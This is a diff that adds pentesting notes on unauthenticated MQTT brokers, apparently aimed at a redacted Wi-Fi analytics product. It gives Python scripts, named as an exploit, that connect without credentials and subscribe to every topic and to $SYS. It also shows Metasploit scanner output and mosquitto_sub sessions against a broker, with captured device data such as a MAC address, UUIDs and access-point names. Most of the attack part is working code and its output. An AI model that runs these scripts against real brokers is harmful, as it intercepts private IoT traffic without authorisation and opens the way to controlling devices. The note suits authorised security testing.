@@ -1,0 +1,178 @@
+Basic Information
+
+MQTT is the Message Queuing Telemetry Transport, or MQ Telemetry Transport, and is a simple publish-subscribe messaging protocol built on TCP/IP.
+
+or more complicated version:
+
+MQTT stands for MQ Telemetry Transport. It is a publish/subscribe, extremely simple and lightweight messaging protocol, 
+designed for constrained devices and low-bandwidth, high-latency or unreliable networks. 
+The design principles are to minimise network bandwidth and device resource requirements whilst also attempting to ensure reliability and some 
+degree of assurance of delivery. These principles also turn out to make the protocol ideal of the emerging “machine-to-machine” (M2M) or 
+“Internet of Things” world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.
+
+Default port: 1883
+
+you could run this code to try to connect to a MQTT service without authentication, subscribe to every topic and listen them:
+
+affected:
+
+"[redacted] is the industry’s first Big Data Wi-Fi analytics and reporting engine purpose built to help service providers make 
+informed business decisions regarding the operation of their Wi-Fi networks. It makes use of Big Data technology and storage innovations found in 
+columnar database repositories, which greatly enhance the scale and performance of a system when used to process historical data."
+
+#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
+
+copy below code to : mqtt.py and run it
+
+import paho.mqtt.client as mqtt
+import time
+import os
+
+HOST = "127.0.0.1"
+PORT = 1883
+
+def on_connect(client, userdata, flags, rc):
+	client.subscribe('#', qos=1)
+	client.subscribe('$SYS/#')
+
+def on_message(client, userdata, message):
+	print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))
+
+def main():
+	client = mqtt.Client()
+	client.on_connect = on_connect
+	client.on_message = on_message
+	client.connect(HOST, PORT)
+	client.loop_start()
+	#time.sleep(10)
+	#client.loop_stop()
+
+if __name__ == "__main__":
+	main()
+
+
+see: https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto
+
+or
+
+
+use: https://github.com/bapowell/python-mqtt-client-shell
+
+
+more:
+
+
+You can connect to a server and subscribe to all topics with a simple script:
+
+
+import paho.mqtt.client as mqtt
+def on_connect(client, userdata, flags, rc):
+   print "[+] Connection successful"
+   client.subscribe('#', qos = 1)        # Subscribe to all topics
+   client.subscribe('$SYS/#')            # Broker Status (Mosquitto)
+def on_message(client, userdata, msg):
+   print '[+] Topic: %s - Message: %s' % (msg.topic, msg.payload)
+client = mqtt.Client(client_id = "MqttClient")
+client.on_connect = on_connect
+client.on_message = on_message
+client.connect('SERVER IP HERE', 1883, 60)
+client.loop_forever()
+
+
+in short: 
+
+A frightening security risk appears when an attacker is able to control IoT devices by publishing commands to a MQTT topic. 
+
+
+See screenshot: ((Does not require authentication))
+
+msf5 auxiliary(scanner/mqtt/connect) > run
+
+[*] 1.2.3.4:1883  - 1.2.3.4:1883 - Testing without credentials
+[+] 1.2.3.4:1883  - Does not require authentication
+[*] 1.2.3.4:1883  - Scanned 1 of 1 hosts (100% complete)
+
+
+Reference:
+
+https://blog.rapid7.com/2018/01/02/yankee-swapped-mqtt-primer-exposure-exploitation-and-exploration/
+
+https://github.com/mqtt/mqtt.org/wiki/SYS-Topics
+
+
+This page is meant to be find a common view on MQTT $SYS. At the moment, many broker implementations implement some kind of $SYS topic but there isn't a common definition of required and optional $SYS topics for broker implementations yet.
+
+root@kali:~/python-mqtt-client-shell# python exploit.py 
+[+] Connection successful
+[+] Topic: $SYS/broker/version - Message: mosquitto version 1.4.14
+[+] Topic: $SYS/broker/timestamp - Message: 2017-07-18 11:17:44+0000
+[truncated]
+[+] Topic: $SYS/broker/bytes/sent - Message: 188988450
+[+] Topic: $SYS/broker/publish/bytes/sent - Message: 184998909
+
+    print "[+] Connection successful"
+          ^
+root@kali:~/python-mqtt-client-shell# python exploit.py 
+[+] Connection successful
+[+] Topic: $SYS/broker/version - Message: mosquitto version 1.4.14
+[+] Topic: $SYS/broker/timestamp - Message: 2017-07-18 11:17:44+0000
+[+] Topic: $SYS/broker/uptime - Message: 2267595 seconds
+[truncated]
+
+root@kali:~/python-mqtt-client-shell# 
+root@kali:~/python-mqtt-client-shell# python exploit.py 
+[+] Connection successful
+[+] Topic: $SYS/broker/version - Message: mosquitto version 1.4.14
+[+] Topic: $SYS/broker/timestamp - Message: 2017-07-18 11:17:44+0000
+[+] Topic: $SYS/broker/uptime - Message: 2283523 seconds
+[truncated]
+[+] Topic: $SYS/broker/load/publish/sent/5min - Message: 0.27
+[+] Topic: $SYS/broker/load/publish/sent/15min - Message: 0.82
+
+
+Install MQTT clients
+sudo apt-get install mosquitto-clients
+
+Mosquitto clients help us easily test MQTT through a command line utility. We will use two command windows, one to subscribe to a topic 
+named "test" and one to publish a message to it.
+
+Topics are labels used by the broker to filter messages for each connected client. 
+A client program subscribed to a topic "Home1/BedroomTemp" will only 
+listen to messages published to the same topic by other clients.
+
+
+
+root@kali:~/python-mqtt-client-shell# mosquitto_sub -t '#' -h 1.2.3.4 -p 1883
+
+3.5 ҕ���.*
+Amazon-vSZ�1C:3A:60:04:13:20▒ݳ�� �▒*$d96b1670-4fe4-4df6-a7e5-58c1a44225d7:$f1544436-51e1-416e-9fdb-642e80b384beB$c92391aa-ee35-4015-8304-f0fdf14ea970J$db669719-a860-4b19-909a-b19fab4ac6cbR$839f87c6-d116-497e-afce-aa8157abd30cZ$00000000-0000-0000-0000-000000000000bSuperjTEC Centralized Test 5.2.1rdefaultzCTEC Testing Roaming�۳����AP�
+                                                       191949005813
+[truncated]                                                       
+
+3.5 �����.*
+Amazon-vSZ�▒Ӹ�� Ӹ��(�2$7382de2f-967f-430d-90ec-d58f4d735372:$47dcbfa8-6f5d-4f82-b102-960edb93b16dBAP-01J$2c72a051-c103-4d26-840f-d81157d6a14eR$839f87c6-d116-497e-afce-aa8157abd30cZ$00000000-0000-0000-0000-000000000000b$c92391aa-ee35-4015-8304-f0fdf14ea970
+
+
+^Z
+[4]+  Stopped                 mosquitto_sub -t '#' -h 1.2.3.4 -p 1883
+
+
+started new:, observe the entire $SYS hierarchy, 
+
+root@kali:~/python-mqtt-client-shell# mosquitto_sub -t '$SYS/broker/clients/connected/#' -h 1.2.3.4 -p 1883 -v
+$SYS/broker/clients/connected 4
+$SYS/broker/clients/connected 5
+
+I've subscribed to $SYS/#.
+
+root@kali:~/python-mqtt-client-shell# mosquitto_sub -t '$SYS/#' -h 1.2.3.4 -p 1883 -v
+$SYS/broker/version mosquitto version 1.4.14
+$SYS/broker/timestamp 2017-07-18 11:17:44+0000
+$SYS/broker/uptime 1140953 seconds
+$SYS/broker/clients/total 3
+$SYS/broker/clients/inactive 1
+$SYS/broker/clients/disconnected 1
+$SYS/broker/clients/active 2
+$SYS/broker/clients/connected 2
+$SYS/broker/clients/expired 0
+[truncated]
